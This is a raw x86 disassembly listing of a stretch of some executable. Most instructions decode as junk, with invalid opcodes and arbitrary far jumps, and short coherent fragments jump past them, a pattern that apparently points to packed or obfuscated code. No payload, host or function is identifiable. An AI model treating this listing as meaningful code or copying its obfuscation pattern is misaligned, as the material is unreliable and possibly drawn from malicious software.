  40addf:	dec    esp
  40ade0:	fxch   st(4)
  40ade2:	ret    
  40ade3:	inc    ebx
  40ade4:	add    al,BYTE PTR [ebx+0x6d]
  40ade7:	loope  0x40ae57
  40ade9:	test   DWORD PTR [eax+0x78b93c1e],edx
  40adef:	sbb    esi,eax
  40adf1:	cmp    DWORD PTR [eax+0x2d5c0fe0],eax
  40adf7:	push   cs
  40adf8:	lods   al,BYTE PTR ds:[esi]
  40adf9:	jmp    0x1c8f:0xbd38f866
  40ae00:	mov    edx,0x80632113
  40ae05:	add    BYTE PTR [ecx],0x2a
  40ae08:	jmp    0x2d60a3ca
  40ae0d:	jb     0x40ae2e
  40ae0f:	adc    ebp,0xba9fb694
  40ae15:	mov    BYTE PTR fs:0xf5bbffa8,dl
  40ae1c:	nop
  40ae1d:	pushf  
  40ae1e:	stos   BYTE PTR es:[edi],al
  40ae1f:	es aam 0x9
  40ae22:	lea    eax,[ebx]
  40ae24:	pushf  
  40ae25:	shl    ah,1
  40ae27:	cmp    al,0x39
  40ae29:	xor    ch,BYTE PTR ds:0x4f3d1e7
  40ae2f:	mov    ch,0xbf
  40ae31:	xchg   ebx,eax
  40ae32:	push   esp
  40ae33:	xchg   ebx,eax
  40ae34:	cwde   
  40ae35:	scas   eax,DWORD PTR es:[edi]
  40ae36:	push   cs
  40ae37:	retf   0x9819
  40ae3a:	push   ecx
  40ae3b:	and    al,dl
  40ae3d:	imul   ecx,DWORD PTR [esi+0x242e6c9c],0x4444549
  40ae47:	mov    ah,0x88
  40ae49:	test   BYTE PTR [esp+ecx*2-0x46],ah
  40ae4d:	lock les edi,FWORD PTR [esi-0x8]
  40ae51:	leave  
  40ae52:	pop    esi
  40ae53:	and    ah,BYTE PTR [edx+0x3fe4c628]
  40ae59:	int3   
  40ae5a:	call   0x26e5:0x208650a4
  40ae61:	jecxz  0x40ae0f
  40ae63:	aas    
  40ae64:	xchg   edi,eax
  40ae65:	sti    
  40ae66:	push   eax
  40ae67:	xor    DWORD PTR [esi+0x49],ebx
  40ae6a:	mov    edx,0x604966b4
  40ae6f:	push   es
  40ae70:	cmp    DWORD PTR [ecx+0x5ec4cf8a],edi
  40ae76:	push   ds
  40ae77:	and    ebx,DWORD PTR [eax-0x65775ca8]
  40ae7d:	adc    dh,BYTE PTR [edx]
  40ae7f:	or     dh,BYTE PTR [eax]
  40ae81:	and    DWORD PTR [ecx-0x53],ecx
  40ae84:	and    BYTE PTR [ecx+0x1b],0x41
  40ae88:	(bad)  
  40ae8a:	shl    BYTE PTR [ebx-0x1a],cl
  40ae8d:	lock repnz test BYTE PTR [ebx+0x794d8b44],0x63
  40ae96:	out    0x55,al
  40ae98:	xor    al,0xb9
  40ae9a:	mov    dh,0x56
  40ae9c:	ror    esp,cl
  40ae9e:	pop    eax
  40ae9f:	xor    eax,0x9193203d
  40aea4:	add    eax,0x679f0bfc
  40aea9:	cmc    
  40aeaa:	mov    bl,0x6c
  40aeac:	mov    al,0x95
  40aeae:	ss scas al,BYTE PTR es:[edi]
  40aeb0:	cwde   
  40aeb1:	pop    ds
  40aeb2:	xchg   bh,dl
  40aeb4:	pop    esi
  40aeb5:	(bad)  
  40aeb6:	or     al,0x94
  40aeb8:	mov    al,dl
  40aeba:	std    
  40aebb:	xlat   BYTE PTR ds:[ebx]
  40aebc:	mov    ch,BYTE PTR [ebp+0x63]
  40aebf:	test   DWORD PTR [ebp-0x6],0x64937434
  40aec6:	mov    ebp,0x64a74d65
  40aecb:	dec    ebp
  40aecc:	(bad)  
  40aecd:	or     edi,esp
  40aecf:	push   esp
  40aed0:	add    ebp,eax
  40aed2:	rcr    al,0x1b
  40aed5:	in     eax,0xec
  40aed7:	mov    dh,BYTE PTR [ebp-0x13]
  40aeda:	jne    0x40ae8f
  40aedc:	xchg   ecx,eax
  40aedd:	out    dx,eax
  40aede:	inc    eax
  40aedf:	clc    
  40aee0:	jp     0x40aead
  40aee2:	add    ch,ch
  40aee4:	cmp    DWORD PTR [edi],edi
  40aee6:	arpl   WORD PTR [ebx-0x6d],bp
  40aee9:	sub    BYTE PTR [esi+0x6a],0x62
  40aeed:	inc    edi
  40aeee:	gs repz jbe 0x40af65
  40aef2:	jmp    0x40af35
  40aef4:	xchg   edx,eax
  40aef5:	xor    eax,0x58558b84
  40aefa:	pop    ebx
  40aefb:	and    al,0xc6
  40aefd:	imul   ecx,DWORD PTR ds:0x7f132640,0xdddd23f4
  40af07:	ds sub eax,0x6aa23c13
  40af0d:	in     eax,dx
  40af0e:	retf   
  40af0f:	push   cs
  40af10:	inc    esi
  40af11:	xor    cl,BYTE PTR [edx-0x27]
  40af14:	div    ebp
  40af16:	sbb    ch,BYTE PTR [ebp+ecx*1+0x52]
  40af1a:	pop    esi
  40af1b:	test   eax,0x2eb778af
  40af20:	push   edi
  40af21:	stc    
  40af22:	(bad)  
  40af23:	loope  0x40aeb5
  40af25:	jp     0x40aeed
  40af27:	loop   0x40af86
  40af29:	mov    ebp,0xfc559f42
  40af2e:	fxch   st(6)
  40af30:	inc    esi
  40af31:	mov    edi,0x312443c1
  40af36:	stc    
  40af37:	ss or  al,0x97
  40af3a:	out    0x83,al
  40af3c:	ret    
  40af3d:	aad    0x1a
  40af3f:	sti    
  40af40:	jge    0x40af59
  40af42:	xchg   edx,eax
  40af43:	test   al,0x0
  40af45:	in     eax,0x34
  40af47:	in     eax,0x28
  40af49:	add    bh,cl
  40af4b:	dec    edi
  40af4c:	out    dx,eax
  40af4d:	adc    dh,BYTE PTR [esi]
  40af4f:	or     al,0x46
  40af51:	add    DWORD PTR [ebx+0x33942553],ebp
  40af57:	pop    edx
  40af58:	loop   0x40af41
  40af5a:	dec    ecx
  40af5b:	add    DWORD PTR ds:0xebc20333,esp
  40af61:	mov    dh,0x5
  40af63:	xchg   esp,eax
  40af64:	outs   dx,BYTE PTR ds:[esi]
  40af65:	icebp  
  40af66:	cmp    DWORD PTR [ebx+0x60676e11],ebp
  40af6c:	cmp    al,0x5c
  40af6e:	push   cs
  40af6f:	pop    esi
  40af70:	popf   
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	xchg   ebp,eax
  40b018:	pop    es
  40b019:	pop    edi
  40b01a:	cmc    
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	cmp    eax,0x5ffd23cd
  40b028:	pop    ebp
  40b029:	jg     0x40b056
  40b02b:	dec    ebp
  40b02c:	jg     0x40b01a
  40b02e:	test   DWORD PTR [edi],ebx
  40b030:	out    0x69,al
  40b032:	dec    eax
  40b033:	imul   ebp,edx,0x55
  40b036:	fwait
  40b037:	bound  ebx,QWORD PTR [ebx+0x587e51d9]
  40b03d:	jo     0x40b00a
  40b03f:	call   FWORD PTR [eax-0x20]
  40b042:	int    0x7d
  40b044:	pop    es
  40b045:	out    0xb0,al
  40b047:	cli    
  40b048:	rcl    BYTE PTR [ecx],cl
  40b04a:	pop    ss
  40b04b:	std    
  40b04c:	xor    al,BYTE PTR [edx-0x10]
  40b04f:	mov    eax,ds:0x734ae375
  40b054:	jbe    0x40b037
  40b056:	sub    esi,DWORD PTR [ebp-0x7a713f71]
  40b05c:	cmp    bh,ah
  40b05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b05f:	xor    ch,BYTE PTR [ebx+eiz*4+0xd]
  40b063:	(bad)  
  40b064:	stc    
  40b065:	fld    st(3)
  40b067:	xor    DWORD PTR [ecx+0x34],ecx
  40b06a:	mov    esp,0xb9cb86c0
  40b06f:	out    0x8a,eax
  40b071:	arpl   WORD PTR [edx],di
  40b073:	mov    eax,0xc8f53fc9
  40b078:	cmp    DWORD PTR ds:0x575c2385,esp
  40b07e:	mov    cl,0x3
  40b080:	mov    ebx,0x8e218cf9
  40b085:	xor    al,0x6c
  40b087:	test   eax,ebp
  40b089:	call   0x6bc44830
  40b08e:	adc    BYTE PTR [edx],0xff
  40b091:	xchg   ebp,eax
  40b092:	sbb    ecx,eax
  40b094:	jb     0x40b04a
  40b096:	inc    esi
  40b097:	inc    eax
  40b098:	push   0x6c
  40b09a:	and    edi,DWORD PTR ds:0x981d5343
  40b0a0:	loop   0x40b0b7
  40b0a2:	pop    ebx
  40b0a3:	sub    BYTE PTR [ebp+ecx*1+0x1302b137],al
  40b0aa:	das    
  40b0ab:	retf   
  40b0ac:	and    al,BYTE PTR [ebp-0x25]
  40b0af:	jle    0x40b11b
  40b0b1:	ret    0xaee3
  40b0b4:	jmp    0xf5ea2fde
  40b0b9:	in     al,0x5d
  40b0bb:	test   BYTE PTR [edi],bh
  40b0bd:	into   
  40b0be:	push   esp
  40b0bf:	add    DWORD PTR [ecx+0x176240ed],esi
  40b0c5:	repz sbb BYTE PTR [edi],dl
  40b0c8:	pop    esi
  40b0c9:	dec    ebp
  40b0ca:	dec    ecx
  40b0cb:	xchg   esp,eax
  40b0cc:	nop
  40b0cd:	mov    BYTE PTR [ebp+eiz*4-0xe],bh
  40b0d1:	jmp    0x7048:0x60ffe79
  40b0d8:	xchg   ebx,eax
  40b0d9:	jle    0x40b140
  40b0db:	scas   eax,DWORD PTR es:[edi]
  40b0dc:	dec    eax
  40b0dd:	(bad)  
  40b0df:	jp     0x40b0a1
  40b0e1:	mov    esp,0x12782bdf
  40b0e6:	add    bh,BYTE PTR [ebx+0x18]
  40b0e9:	xor    ebp,eax
  40b0eb:	sub    ax,0x87f7
  40b0ef:	push   cs
  40b0f0:	push   ebp
  40b0f1:	popf   
  40b0f2:	rol    ecx,0x75
  40b0f5:	sbb    al,0x78
  40b0f7:	jge    0xb54ba88b
  40b0fd:	add    edx,DWORD PTR [eax+0x76]
  40b100:	repz adc edx,ebp
  40b103:	jle    0x40b118
  40b105:	and    esp,DWORD PTR [edi]
  40b107:	lds    ecx,FWORD PTR [esi-0x14]
  40b10a:	pop    ecx
  40b10b:	push   ecx
  40b10c:	jl     0x40b13e
  40b10e:	and    cl,0xd1
  40b111:	xor    cl,0x1c
  40b114:	in     al,0xe0
  40b116:	xchg   ebp,eax
  40b117:	cmp    BYTE PTR [eax-0x41b2f2e4],ah
  40b11d:	cmp    dl,0xa3
  40b120:	push   ds
  40b121:	inc    ebx
  40b122:	adc    eax,0x69caf060
  40b127:	sub    edi,DWORD PTR [ebp+0x3a270128]
  40b12d:	es sahf 
  40b12f:	in     al,dx
  40b130:	int3   
  40b131:	mov    al,ds:0x47c2a89
  40b136:	push   ds
  40b137:	dec    edi
  40b138:	inc    esi
  40b139:	mov    DWORD PTR [ebp+0x3e7f15e1],esp
  40b13f:	lea    esp,[ebx+0x3b]
  40b142:	cmp    esp,ecx
  40b144:	mov    esi,0x7737d229
  40b149:	cmp    BYTE PTR [ecx-0x5b4b2f38],0x8e
  40b150:	or     eax,0x670b9832
  40b155:	push   ss
  40b156:	push   edi
  40b157:	pushf  
  40b158:	xchg   BYTE PTR [ebp-0x19615cd5],cl
  40b15e:	retf   0x7c8d
  40b161:	push   DWORD PTR [ebx+0xe]
  40b164:	jmp    0x215c:0xe699da7d
  40b16b:	add    BYTE PTR ds:0x22b8cfe2,dl
  40b171:	into   
  40b172:	dec    ebp
  40b173:	jmp    0x96b9:0xd5e9a2bd
  40b17a:	jmp    0x3e16:0x1b769e59
  40b181:	mov    DWORD PTR [ebx-0x42f5dcf3],ebp
  40b187:	xchg   BYTE PTR [edx-0x65],ah
  40b18a:	(bad)  
  40b18b:	into   
  40b18c:	xchg   edx,eax
  40b18d:	sub    bl,BYTE PTR [ebp-0x6b]
  40b190:	in     eax,0xbf
  40b192:	mov    ?,WORD PTR [ebx+0x7c]
  40b195:	in     al,0xce
  40b197:	xchg   ecx,eax
  40b198:	int    0x3a
  40b19a:	jne    0x40b1ed
  40b19c:	dec    edi
  40b19d:	mov    esi,ecx
  40b19f:	scas   al,BYTE PTR es:[edi]
  40b1a0:	mov    WORD PTR [ecx],ss
  40b1a2:	lods   eax,DWORD PTR ds:[esi]
  40b1a3:	inc    ecx
  40b1a4:	dec    edi
  40b1a5:	push   edi
  40b1a6:	inc    ecx
  40b1a7:	jge    0x40b168
  40b1a9:	pop    eax
  40b1aa:	ins    BYTE PTR es:[edi],dx
  40b1ab:	aam    0x59
  40b1ad:	xchg   esp,eax
  40b1ae:	popa   
  40b1af:	dec    ecx
  40b1b0:	test   DWORD PTR [eax+0x5068c598],edx
  40b1b6:	add    ecx,DWORD PTR [eax+0x7f]
  40b1b9:	aam    0xbf
  40b1bb:	mov    eax,0xbcb9cfc9
  40b1c0:	stc    
  40b1c1:	aad    0x77
  40b1c3:	cmp    BYTE PTR [edi+0x2b],al
  40b1c6:	sahf   
  40b1c7:	loop   0x40b210
  40b1c9:	sbb    bl,BYTE PTR [edx-0x6b251df3]
  40b1cf:	jnp    0x40b184
  40b1d1:	xchg   edx,eax
  40b1d2:	lock call 0xf958:0xeb47f2ea
  40b1da:	sub    al,0xf0
  40b1dc:	push   ds
  40b1dd:	sub    ebp,ebp
  40b1df:	fbstp  TBYTE PTR [ecx+0x0]
  40b1e2:	or     eax,0x45502ddd
  40b1e7:	bound  eax,QWORD PTR [eax]
  40b1e9:	xchg   BYTE PTR [edx],ch
  40b1eb:	add    eax,esi
  40b1ed:	mov    ebx,0x52d2e248
  40b1f2:	push   es
  40b1f3:	jbe    0x40b1e9
  40b1f5:	xchg   ebx,eax
  40b1f6:	outs   dx,BYTE PTR ds:[esi]
  40b1f7:	push   ds
  40b1f8:	call   FWORD PTR cs:[eax+0x33]
  40b1fc:	and    ebx,ecx
  40b1fe:	fcmovb st,st(1)
  40b200:	mov    al,ds:0x3a16f72c
  40b205:	clc    
  40b206:	sbb    DWORD PTR [eax-0x649ed3c1],ebp
  40b20c:	mov    edx,DWORD PTR [ecx]
  40b20e:	cs pop edi
  40b210:	mov    al,ds:0xb56c9b5c
  40b215:	pop    edi
  40b216:	lahf   
  40b217:	mov    esi,DWORD PTR [ebp+ebp*2+0x3b6ec844]
  40b21e:	mov    esp,0xeffebf99
  40b223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b224:	mov    BYTE PTR [ecx-0x418c5ffb],0xe5
  40b22b:	fist   DWORD PTR [eax]
  40b22d:	mov    eax,0x442b74ec
  40b232:	lods   eax,DWORD PTR ds:[esi]
  40b233:	lock addr16 hlt 
  40b236:	adc    BYTE PTR [eax-0x7a],ah
  40b239:	jae    0x40b295
  40b23b:	mov    ch,0x8c
  40b23d:	sub    al,dl
  40b23f:	cs addr16 gs daa 
  40b243:	ins    DWORD PTR es:[edi],dx
  40b244:	sbb    eax,0x69874ca4
  40b249:	hlt    
  40b24a:	mov    ah,0xe5
  40b24c:	inc    ebp
  40b24d:	dec    esi
  40b24e:	jo     0x40b271
  40b250:	and    BYTE PTR [esi-0x5e],ch
  40b253:	xchg   esi,eax
  40b254:	sbb    bl,BYTE PTR [ecx-0xb]
  40b257:	popa   
  40b258:	cmp    al,0x9a
  40b25a:	sub    dh,al
  40b25c:	(bad)  
  40b25d:	js     0x40b253
  40b25f:	test   DWORD PTR [eax-0xd],esp
  40b262:	loope  0x40b27b
  40b264:	stos   BYTE PTR es:[edi],al
  40b265:	inc    esp
  40b266:	mov    bh,0x1e
  40b268:	repnz mov eax,DWORD PTR [ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	repnz pop ecx
  40b285:	xchg   ecx,eax
  40b286:	xor    al,0x2e
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	push   edx
  40b290:	add    BYTE PTR [edi-0x52],ah
  40b293:	out    dx,eax
  40b294:	cmp    al,0x44
  40b296:	ins    BYTE PTR es:[edi],dx
  40b297:	sub    dh,bl
  40b299:	xor    esp,DWORD PTR [edi+ecx*4]
  40b29c:	and    DWORD PTR [di+0x7ca1],edi
  40b2a1:	adc    DWORD PTR [ebx-0x40],esi
  40b2a4:	sti    
  40b2a5:	fcom   DWORD PTR ds:0xefb0396
  40b2ab:	inc    esp
  40b2ac:	cwde   
  40b2ad:	dec    esp
  40b2ae:	adc    ebx,DWORD PTR [ebp+eiz*8-0x65aa444f]
  40b2b5:	test   eax,0xe72cde92
  40b2ba:	inc    ecx
  40b2bb:	icebp  
  40b2bc:	out    dx,eax
  40b2bd:	mov    ebp,0x790f56de
  40b2c2:	pop    eax
  40b2c3:	test   eax,0x3c41f9f2
  40b2c8:	jecxz  0x40b256
  40b2ca:	test   eax,0xc9386b92
  40b2cf:	pop    edi
  40b2d0:	into   
  40b2d1:	es retf 0x2497
  40b2d5:	pop    esp
  40b2d6:	ds add al,0x27
  40b2d9:	iret   
  40b2da:	cld    
  40b2db:	fdivr  st,st(7)
  40b2dd:	adc    eax,0xa0507e4d
  40b2e2:	jbe    0x40b2a3
  40b2e4:	ins    BYTE PTR es:[edi],dx
  40b2e5:	jmp    0x40b295
  40b2e7:	pop    ecx
  40b2e8:	jnp    0x40b339
  40b2ea:	sbb    al,0xe0
  40b2ec:	push   ds
  40b2ed:	sub    eax,0x46cb5c9e
  40b2f2:	pop    ss
  40b2f3:	loopne 0x40b314
  40b2f5:	rcl    ah,0x27
  40b2f8:	fisttp DWORD PTR [eax]
  40b2fa:	xchg   BYTE PTR [bx+si-0x1234],bh
  40b2ff:	mov    eax,0x32be80cb
  40b304:	retf   
  40b305:	xor    DWORD PTR [ecx-0x4a],eax
  40b308:	or     bl,ah
  40b30a:	push   es
  40b30b:	xchg   esi,eax
  40b30c:	or     eax,eax
  40b30e:	jae    0x40b2cf
  40b310:	(bad)  
  40b311:	shr    ecx,1
  40b313:	sub    DWORD PTR [ebp-0x66839ab1],esi
  40b319:	cmp    eax,0x53b1b70f
  40b31e:	sbb    eax,0xa8a0c273
  40b323:	push   edx
  40b324:	or     bh,BYTE PTR [ebx]
  40b326:	cmp    al,0xd3
  40b328:	xchg   ecx,eax
  40b329:	add    al,0xbe
  40b32b:	dec    edx
  40b32c:	mov    eax,ds:0xcef0c749
  40b331:	or     al,0x6a
  40b333:	push   edi
  40b334:	call   0x7803:0xc972fa15
  40b33b:	dec    edi
  40b33c:	inc    edx
  40b33d:	pop    ds
  40b33e:	in     al,dx
  40b33f:	sbb    eax,0x232fb2de
  40b344:	mov    dl,0x8
  40b346:	dec    edx
  40b347:	cwde   
  40b348:	sub    DWORD PTR [edi+0x75],edi
  40b34b:	test   cl,dl
  40b34d:	aaa    
  40b34e:	ss mov edx,0x48a4522d
  40b354:	pop    ecx
  40b355:	sub    esi,ebp
  40b357:	aaa    
  40b358:	sahf   
  40b359:	js     0x40b346
  40b35b:	adc    eax,0x6aeceaf
  40b360:	mov    edi,0x3283d9de
  40b365:	fwait
  40b366:	mov    ebx,0x9df8893d
  40b36b:	rcl    esp,cl
  40b36d:	pop    ss
  40b36e:	aad    0xb8
  40b370:	sub    cl,ch
  40b372:	repz sbb BYTE PTR [ebp+0x4],0x6f
  40b377:	mov    dh,0xf8
  40b379:	je     0x40b3a3
  40b37b:	pushf  
  40b37c:	lods   eax,DWORD PTR ds:[esi]
  40b37d:	pop    ecx
  40b37e:	test   al,0x41
  40b380:	outs   dx,BYTE PTR ds:[esi]
  40b381:	inc    edx
  40b382:	loopne 0x40b35d
  40b384:	pop    ebx
  40b385:	mov    ah,0x65
  40b387:	daa    
  40b388:	push   esi
  40b389:	and    bh,BYTE PTR [ebx+0x53c69689]
  40b38f:	adc    esi,DWORD PTR [eax+eiz*1+0x1f]
  40b393:	pop    ss
  40b394:	mov    ebx,0xf048cc3c
  40b399:	dec    esp
  40b39a:	pop    ebx
  40b39b:	mov    ds:0x6b7a283e,eax
  40b3a0:	jo     0x40b3dc
  40b3a2:	sub    eax,0xe8657f25
  40b3a7:	inc    edi
  40b3a8:	and    edi,ebx
  40b3aa:	xor    ebx,DWORD PTR [edi+0x2c]
  40b3ad:	push   eax
  40b3ae:	pop    ds
  40b3af:	hlt    
  40b3b0:	or     eax,0xcdb4fe4c
  40b3b5:	inc    edx
  40b3b6:	cmp    al,0x4f
  40b3b8:	pop    ebx
  40b3b9:	xor    esp,DWORD PTR [edi+0x42]
  40b3bc:	xor    dh,dl
  40b3be:	int3   
  40b3bf:	pop    ebx
  40b3c0:	jne    0x40b34d
  40b3c2:	cmc    
  40b3c3:	stos   DWORD PTR es:[edi],eax
  40b3c4:	mov    eax,0x33a826da
  40b3c9:	mov    gs,WORD PTR ds:0xbb76ea3b
  40b3cf:	push   cs
  40b3d0:	inc    ebp
  40b3d1:	into   
  40b3d2:	mov    bl,0x26
  40b3d4:	inc    ebx
  40b3d5:	inc    esi
  40b3d6:	test   BYTE PTR [edi+eax*2+0x2f3fd83f],dl
  40b3dd:	lea    esp,[ebx]
  40b3df:	aas    
  40b3e0:	enter  0x25a7,0x1a
  40b3e4:	or     al,0x34
  40b3e6:	fisttp DWORD PTR [edx]
  40b3e8:	and    ch,BYTE PTR [ebx+edi*2-0x1afd827e]
  40b3ef:	pusha  
  40b3f0:	or     BYTE PTR [ebx],bh
  40b3f2:	jmp    0x40b38a
  40b3f4:	mov    ah,BYTE PTR [ecx]
  40b3f6:	test   BYTE PTR ds:[esi+0x4b],dh
  40b3fa:	lds    edi,FWORD PTR [eax-0x32c9f114]
  40b400:	cs mov ecx,0x40c28038
  40b406:	push   esp
  40b407:	pcmpgtb mm5,QWORD PTR [ebx-0x3ed0c903]
  40b40e:	test   eax,0xd711e495
  40b413:	ror    BYTE PTR [esi],1
  40b415:	xlat   BYTE PTR ds:[ebx]
  40b416:	mov    dh,0x87
  40b418:	mov    dh,0xd7
  40b41a:	sbb    DWORD PTR [ebp-0x5934cff3],esp
  40b420:	je     0x40b3d6
  40b422:	mov    ah,0xd5
  40b424:	inc    ebx
  40b425:	dec    edx
  40b426:	pop    edx
  40b427:	fucomip st,st(4)
  40b429:	xor    al,al
  40b42b:	sub    dl,BYTE PTR [edi+0x17]
  40b42e:	and    DWORD PTR [ebp-0x731d93c1],edi
  40b434:	sub    cx,0xfd95
  40b439:	lahf   
  40b43a:	mov    BYTE PTR [esi+0x5faf79c],0xba
  40b441:	add    DWORD PTR [esi-0x7fbe5140],edi
  40b447:	pop    esi
  40b448:	imul   edx,DWORD PTR [ebx],0xb92d7bd1
  40b44e:	adc    al,0x4a
  40b450:	xchg   ebx,eax
  40b451:	out    0xcb,al
  40b453:	in     eax,0x9
  40b455:	sti    
  40b456:	fst    st(4)
  40b458:	cmp    BYTE PTR [ecx],ch
  40b45a:	int    0x3d
  40b45c:	push   esi
  40b45d:	inc    edx
  40b45e:	adc    DWORD PTR [eax],esi
  40b460:	adc    dl,BYTE PTR [ebp-0x1b51cd88]
  40b466:	ss aam 0xbd
  40b469:	(bad)  
  40b46a:	repz shr DWORD PTR [edi+0x57],1
  40b46e:	xchg   ebp,eax
  40b46f:	iret   
  40b470:	mov    dh,BYTE PTR [ecx+eiz*2-0x78]
  40b474:	test   eax,0x79785db3
  40b479:	mov    dh,0xf9
  40b47b:	xor    al,0x39
  40b47e:	loopne 0x40b401
  40b480:	sahf   
  40b481:	pop    ebx
  40b482:	mov    bh,0x60
  40b484:	xor    ch,al
  40b486:	outs   dx,BYTE PTR ds:[esi]
  40b487:	mov    WORD PTR [ecx-0x52],fs
  40b48a:	ret    
  40b48b:	pop    edx
  40b48c:	sbb    DWORD PTR [edi-0x4785b23d],0x64
  40b493:	std    
  40b494:	sbb    eax,0x6d958832
  40b499:	inc    edi
  40b49a:	dec    edi
  40b49b:	fs mov dl,0xb5
  40b49f:	jno    0x40b4d7
  40b4a1:	jp     0x40b458
  40b4a3:	push   eax
  40b4a4:	into   
  40b4a5:	stos   DWORD PTR es:[edi],eax
  40b4a6:	jecxz  0x40b51a
  40b4a8:	mov    edi,ecx
  40b4aa:	call   DWORD PTR [esi-0x2f]
  40b4ad:	ja     0x40b4f1
  40b4af:	cdq    
  40b4b0:	nop
  40b4b1:	(bad)  
  40b4b2:	adc    dl,BYTE PTR [edx-0x5]
  40b4b5:	fmul   DWORD PTR [ecx]
  40b4b7:	test   eax,0x4605acbc
  40b4bc:	fist   DWORD PTR [eax]
  40b4be:	enter  0x50db,0x9
  40b4c2:	das    
  40b4c3:	push   es
  40b4c4:	mov    eax,ds:0x1320a336
  40b4c9:	and    bl,cl
  40b4cb:	pop    eax
  40b4cc:	imul   esi,esp,0xffffff81
  40b4cf:	mov    ecx,0xbe7bfb5e
  40b4d4:	retf   
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	cmp    DWORD PTR [esi+0x6c],0xffffffc2
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b510
  40b514:	out    dx,al
  40b515:	ror    DWORD PTR [esi],0x97
  40b518:	jl     0x40b56d
  40b51a:	scas   al,BYTE PTR es:[edi]
  40b51b:	lahf   
  40b51c:	adc    bl,BYTE PTR [ecx+ecx*2-0x6c]
  40b520:	stos   BYTE PTR es:[edi],al
  40b521:	shr    DWORD PTR ds:0x7c7c56e2,cl
  40b527:	(bad)  
  40b528:	mov    edi,0x73978a7f
  40b52d:	mov    bl,ch
  40b52f:	mov    WORD PTR [edx],cs
  40b531:	mov    eax,esp
  40b533:	or     al,0xdb
  40b535:	sbb    DWORD PTR [ebx+0x4a8eff0a],ebp
  40b53b:	push   0xffffff82
  40b53d:	add    DWORD PTR ss:[ecx-0x72],0x872c1eac
  40b545:	sbb    ebx,DWORD PTR es:[esi-0x5b]
  40b549:	mov    al,0xab
  40b54b:	popf   
  40b54c:	push   edx
  40b54d:	stos   BYTE PTR es:[edi],al
  40b54e:	dec    edi
  40b54f:	push   ebx
  40b550:	mov    WORD PTR [ebx],ds
  40b552:	or     esp,DWORD PTR [esi]
  40b554:	shr    BYTE PTR [ecx+0x64],cl
  40b557:	in     al,dx
  40b558:	arpl   WORD PTR [esi+0x15],di
  40b55b:	sbb    eax,0x5e90386d
  40b560:	dec    ebp
  40b561:	jnp    0x40b5a5
  40b563:	fdivr  QWORD PTR [ebp-0x39]
  40b566:	jmp    0xf9e9:0x6a97f3ab
  40b56d:	jmp    0xf10d:0x780a7681
  40b574:	mov    al,0x71
  40b576:	pop    esp
  40b577:	jne    0x40b53d
  40b579:	shr    DWORD PTR [edi],cl
  40b57b:	or     BYTE PTR [edx-0x164c82ac],dh
  40b581:	mov    al,0x4b
  40b583:	push   esi
  40b584:	xor    ch,BYTE PTR [eax-0x5]
  40b587:	ja     0x40b538
  40b589:	lahf   
  40b58a:	lahf   
  40b58b:	mov    ecx,DWORD PTR [ebp+0x50740879]
  40b591:	push   ecx
  40b592:	mov    dh,0x3c
  40b594:	cmp    DWORD PTR es:[esi-0x7a],ebx
  40b598:	rol    DWORD PTR [edx+0x170c4ea1],cl
  40b59e:	aam    0xbb
  40b5a0:	pop    ebp
  40b5a1:	and    eax,0x99f20e2a
  40b5a6:	ja     0x40b598
  40b5a8:	jecxz  0x40b5f2
  40b5aa:	push   esi
  40b5ab:	mov    esp,0x6b857e41
  40b5b0:	loop   0x40b58d
  40b5b2:	push   edx
